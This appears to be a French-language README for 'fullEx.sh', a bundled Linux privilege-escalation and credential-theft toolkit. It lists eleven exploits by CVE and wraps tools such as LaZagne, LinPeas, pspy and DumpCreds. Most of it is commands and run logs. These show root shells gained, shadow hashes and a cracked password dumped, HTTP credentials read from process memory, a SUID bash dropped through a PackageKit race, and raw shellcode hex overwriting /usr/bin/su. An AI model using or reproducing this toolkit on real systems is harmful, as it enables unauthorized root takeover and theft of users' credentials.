 <img width="1335" height="890" alt="image" src="https://github.com/user-attachments/assets/c947aebb-593b-4027-bc50-ac87663ff387" />


## 💀 Liste d'exploits

| Exploits | CVE | Inclut |
| --- | --- | --- |
| OverlayFS | CVE-2015-1328 | ✅ |
| DirtyCow | CVE-2016-5195 | ✅ |
| PwnKit | CVE-2021-4034 | ✅ |
| DirtyPipe | CVE-2022-0847 | ✅ |
| Sudo-Host | CVE-2025-32462 | ✅ |
| Pack2TheRoot | CVE-2026-41651 | ✅ |
| Copy-Fail | CVE-2026-31431 | ✅ |
| Dirty-Frag | CVE-2026-43284 | ✅ |
| Fragnesia | CVE-2026-46300 |✅|
| ssh-keysign-pwn | CVE-2026-46333 |✅|
| PeditCow | CVE-2026-46331 |✅|

## ⚙️ Outils

| Outils | Description |
| --- | --- |
| LaZagne | Récupére les mots de passe stocké en local |
| LinPeas | Script d'escalade de privilèges Linux |
| Pspy | Surveille les processus Linux sans autorisations root |
| Dumpcreds | Extrait diverses informations d'identification des processus en cours d'exécution |


## 🛠️ Commandes

Pour rendre executable fullEx.sh faire un -perm

```
vagrant@metasploitable3-ub1404:~/fullEx$ bash fullEx.sh -perm
vagrant@metasploitable3-ub1404:~/fullEx$ ./fullEx.sh -help
                                                                                                    
 $$$$$$\            $$\ $$\ $$$$$$$$\           
$$  __$$\           $$ |$$ |$$  _____|          
$$ /  \__|$$\   $$\ $$ |$$ |$$ |      $$\   $$\ 
$$$$\     $$ |  $$ |$$ |$$ |$$$$$\    \$$\ $$  |
$$  _|    $$ |  $$ |$$ |$$ |$$  __|    \$$$$  / 
$$ |      $$ |  $$ |$$ |$$ |$$ |       $$  $$<  
$$ |      \$$$$$$  |$$ |$$ |$$$$$$$$\ $$  /\$$\ 
\__|       \______/ \__|\__|\________|\__/  \__|

               by M0rPH3U53
 
 
Usage: ./fullEx.sh COMMAND
 
Outils:
   -LinPeas       Execute LinPeas
   -LaZagne       Execute LaZagne
   -Pspy64/32     Execute pspy64/32
   -DumpCred      Execute DumpCred
 
Exploits:
   -Overlays      Compilation + execution binaire - CVE-2015-1328
   -DirtyCow      Compilation + execution binaire - CVE-2016-5195
   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034
   -DirtyPipe     DirtyPipe - CVE-2022-0847
   -Host          Sudo Host - CVE-2025-32462
   -CFail         Copy Fail - CVE-2026-31431
   -PKroot        Pack2TheRoot - CVE-2026-41651
   -DirtyFrag     Dirty Frag - CVE-2026-43284
   -Fragnesia     Fragnesia - CVE-2026-46300
   -SKP           ssh-keysign-pwn - CVE-2026-46333
   -PeditCow      Compilation + execution binaire - CVE-2026-46331
 
Cmds:
   -check         Verifie si gcc est installer
   -perm          Applique les droit d'execution sur '/fullEx'
   -help          Affiche les commandes
 ```
## 🤖 LinPeas

```
www-data@Milburg-High:/tmp/fullEx$ bash fullEx.sh -perm
www-data@Milburg-High:/tmp/fullEx$ ./fullEx.sh -LinPeas

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,[ debian=7|8|9|10|11 ],fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

## 👾 LaZagne

```
root@Milburg-High:/tmp/fullEx# ./fullEx.sh -LaZagne
./fullEx.sh -LaZagne

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: seb
Hash: $6$4.6B1rmh$iaH45IN/kqI4A8Yg0oeY74nXxcicIV3gplln3koT/h2T9qDbs6b0jFWyRyuP5f23OAIyNf5F2WwptKSoDvD4o1:17589:0:99999:7:::

[+] 6 passwords have been found.
For more information launch it again with the -v option

elapsed time = 9.25296401978

```

## 👻 Pspy

```
debian@debian12:~/fullEx$ ./fullEx.sh -Pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/04/03 14:08:16 CMD: UID=1000  PID=848    | /home/debian/fullEx/pspy/pspy64 
2026/04/03 14:08:16 CMD: UID=1000  PID=847    | /bin/bash ./fullEx.sh -Pspy64 
2026/04/03 14:08:16 CMD: UID=1000  PID=636    | -bash 
2026/04/03 14:08:16 CMD: UID=1000  PID=635    | sshd: debian@pts/0   
2026/04/03 14:08:16 CMD: UID=1000  PID=616    | (sd-pam) 
2026/04/03 14:08:16 CMD: UID=1000  PID=615    | /lib/systemd/systemd --user 
2026/04/03 14:08:16 CMD: UID=0     PID=612    | sshd: debian [priv]  
2026/04/03 14:08:16 CMD: UID=0     PID=608    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2026/04/03 14:08:16 CMD: UID=0     PID=607    | /sbin/agetty -o -p -- \u --noclear - linux 
2026/04/03 14:08:16 CMD: UID=0     PID=480    | /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev 
2026/04/03 14:08:16 CMD: UID=104   PID=471    | avahi-daemon: chroot helper 
2026/04/03 14:08:16 CMD: UID=0     PID=468    | /lib/systemd/systemd-logind 
2026/04/03 14:08:16 CMD: UID=103   PID=467    | /usr/sbin/snmpd -LOw -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f 
2026/04/03 14:08:16 CMD: UID=100   PID=464    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2026/04/03 14:08:16 CMD: UID=0     PID=462    | /usr/sbin/cron -f 
2026/04/03 14:08:16 CMD: UID=0     PID=461    | /usr/sbin/avahi-dnsconfd -s 
2026/04/03 14:08:16 CMD: UID=104   PID=459    | avahi-daemon: running [debian.local] 
2026/04/03 14:08:16 CMD: UID=0     PID=458    | /usr/sbin/anacron -d -q -s 
2026/04/03 14:08:16 CMD: UID=997   PID=449    | /lib/systemd/systemd-timesyncd 
```
## 🧽 DumpCreds

Avec sudo
```
debian@debian12:~/fullEx$ sudo ./fullEx.sh -DumpCred
Process 2766 (lightdm)
  Hash shadow (/etc/shadow):
    Hash: $1$tu5P8JO6$g5sEFz1ZfpRzRzvjFffnv. = "password" (nick)
Process 2781 (agetty)
Process 2782 (Xorg)
```
Sans sudo
```
debian@debian12:~/fullEx$ ./fullEx.sh -DumpCred
Process 2940 (systemd)
Process 2942 ((sd-pam))
Process 2969 (dbus-daemon)
Process 2972 (pipewire)
Process 2973 (pipewire)
Process 2974 (wireplumber)
Process 2975 (pipewire-pulse)
Process 2979 (sshd-session:)
Process 2980 (mpris-proxy)
Process 2998 (-bash)
  Param HTTP:
    55b84ddae2f1: --data="username=admin&password=test"
    55b84ddca1b0: password=dump
Process 3288 (bash)
Nbs dumped items: 0
```
## 💀 Sudo-Host

```
ubuntu@ubuntuserver2204:~/fullEx$ ./fullEx.sh -Host
sudo: unable to resolve host dev.test.local: Temporary failure in name resolution
root@ubuntuserver2204:~#
```
## 💀 Copy-Fail

```
user@debian:~/fullEx$ ./fullEx.sh -CFail
# id
uid=0(root) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
#
```
## 💀 Pack2TheRoot

```
user@debian:~/fullEx$ ./fullEx.sh -PKroot
============================================================
  CVE-2026-41651 — Pack2TheRoot => PackageKit TOCTOU Privilege Escalation
  github : https://github.com/0xBlackash/CVE-2026-41651/
  Author : Ashraf Zaryouh / @0xBlackash
============================================================

[+] SUID drop directory: /var/tmp  (no nosuid/noexec)
[+] Package format: DEB
[*] Building test packages...
[+] Dummy pkg:   /tmp/pk-dummy-2219.deb
[+] Payload pkg: /tmp/pk-payload-2219.deb
[+] Payload installs SUID bash to: /var/tmp/.suid_bash

[*] Connecting to system D-Bus...
[*] Creating PackageKit transaction...
[+] Transaction ID: /5_cdeecccc

[*] Firing TOCTOU race (SIMULATE → REAL on same transaction)...
[*] Polling for SUID at /var/tmp/.suid_bash (90s max)...
..
[+] Confirmed: /var/tmp/.suid_bash is SUID root (mode=0o104755)

[+] Dropping to root shell via SUID bash (-p preserves effective UID=0)
[+] --- ROOT SHELL FOLLOWS ---

.suid_bash-5.2# bash -p
bash-5.2# id
uid=1000(user) gid=1000(user) euid=0(root) groupes=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
```
## 💀 Dirty-Frag

```
user@debian:~/fullEx$ ./fullEx.sh -DirtyFrag
# id
uid=0(root) gid=0(root) groups=0(root)
```
## 💀 Fragnesia

```
osboxes@ubuntu2204:~/fullEx$ ./fullEx.sh -Fragnesia
[*] uid=1000 euid=1000 gid=1000 egid=1000
[*] mode=xfrm_espintcp_pagecache_replace collateral=after

[*] target=/usr/bin/su size=55672
outer_write_open_denied=1 errno=13 (Permission denied)
userns_setup: outer_uid=1000 outer_gid=1000 ns_uid=0 ns_gid=0
netns_setup=1
loopback_up=1
xfrm_espintcp_state_add=1
namespace_setup_complete=1
userns_root_mapped_to_outer_user_write_open_denied=1 errno=13 (Permission denied)

[*] timing: rx_pre_ulp=30000us tx_pre_splice=1000us rx_post_ulp=30000us
[*] range: offset=0x0 len=192 last=0xbf enc_len=4080 splice_len=4096
[*] union: transformed=0x0-0x10ae collateral_after=0xc0-0x10ae
[*] payload=7f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000005000000000000000000000000004000000000000000400000000000b800000000000000b800000000000000001000000000000031ff31f631c0b06a0f05b0690f05b0740f056a00488d0512000000504889e2488d3d1200000031f66a3b580f055445524d3d787465726d002f62696e2f7368000000000000000000

stream0_table_entries=256

[*] smashing 192 bytes into read-only page cache  changed=174  skipped=18  remaining=0
  0000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00 
  0010  02 00 3e 00 01 00 00 00  78 00 40 00 00 00 00 00 
  0020  40 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 
  0030  00 00 00 00 40 00 38 00  01 00 00 00 00 00 00 00 
  0040  01 00 00 00 05 00 00 00  00 00 00 00 00 00 00 00 
  0050  00 00 40 00 00 00 00 00  00 00 40 00 00 00 00 00 
  0060  b8 00 00 00 00 00 00 00  b8 00 00 00 00 00 00 00 
  0070  00 10 00 00 00 00 00 00  31 ff 31 f6 31 c0 b0 6a 
  0080  0f 05 b0 69 0f 05 b0 74  0f 05 6a 00 48 8d 05 12 
  0090  00 00 00 50 48 89 e2 48  8d 3d 12 00 00 00 31 f6 
  00a0  6a 3b 58 0f 05 54 45 52  4d 3d 78 74 65 72 6d 00 
  00b0  2f 62 69 6e 2f 73 68 00  00 00 00 00 00 00 00 00 
  [==================================================] 192/192 (100%)
────────────────────────────────────────────────────────────

[*] verifying 192 bytes...byte=9a
[*] bytes_flip_summary len=192 changed=174 skipped=18
[+] BUG: changed requested copied byte range to desired values
 firing espintcp splice...
sender_ns_uid=0 euid=0 prefix_send=18 splice_to_tcp=4096 file_off=189 file_off_next=4285
receiver_ns_uid=0 euid=0 espintcp_enabled_after_queue=1
sender_status=0 receiver_status=0
[+] smashed 9a -> 00  index=189 offset=+00bd

byte_flip_nonce=17 stream_byte=39
byte_flip_packet_iv=cccccccc00000011
[*] [191/192] +00be  39 -> 00  xor=39 seq=174 nonce=17
 firing espintcp splice...
sender_ns_uid=0 euid=0 prefix_send=18 splice_to_tcp=4096 file_off=190 file_off_next=4286
receiver_ns_uid=0 euid=0 espintcp_enabled_after_queue=1
sender_status=0 receiver_status=0
[+] smashed 39 -> 00  index=190 offset=+00be

byte_flip_nonce=778 stream_byte=ce
byte_flip_packet_iv=cccccccc0000030a
[*] [192/192] +00bf  ce -> 00  xor=ce seq=175 nonce=778
 firing espintcp splice...
sender_ns_uid=0 euid=0 prefix_send=18 splice_to_tcp=4096 file_off=191 file_off_next=4287
receiver_ns_uid=0 euid=0 espintcp_enabled_after_queue=1
sender_status=0 receiver_status=0
[+] smashed ce -> 00  index=191 offset=+00bf

# id    
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```
## 💀 ssh-keysign-pwn

```
user@debian:~/fullEx$ ./fullEx.sh -SKP
[+] Compilation successfuly !
[+] PATH=/home/user/fullEx/exploit/ssh-keysign-pwn/skp
[+] Executing the binary...
# alive: EPERM on fd 3

# id
uid=0(root) gid=0(root) groups=0(root),1001(user)
```

## 💀 PeditCow

```
user@debian:~/fullEx$ ./fullEx.sh -PeditCow
[+] Compilation successfuly !
[+] PATH=/home/user/fullEx/exploit/PeditCow/peditcow
[+] Executing the binary...
[*] target /bin/su as uid 1001; entry at file offset 0x4330; shellcode 48 bytes
[+] su entry overwritten; exec'ing su -> interactive root shell
# id
uid=0(root) gid=0(root) groups=0(root),27(sudo),100(users),1001(user)
```
